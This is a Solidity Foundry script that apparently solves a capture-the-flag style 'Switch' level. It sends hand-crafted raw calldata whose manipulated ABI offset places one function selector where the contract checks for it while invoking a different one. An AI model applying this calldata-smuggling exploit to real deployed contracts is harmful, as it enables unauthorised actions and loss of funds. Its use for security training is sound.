// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Switch.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract SwitchSolution is Script {
    Switch constant switchInstance =
        Switch(0xE8427Bf741A0C1A331fC27B3fCF770655f5E06E7);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        bytes
            memory callData = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        (bool success, ) = address(switchInstance).call(callData);
        require(success);
        vm.stopBroadcast();
    }
}
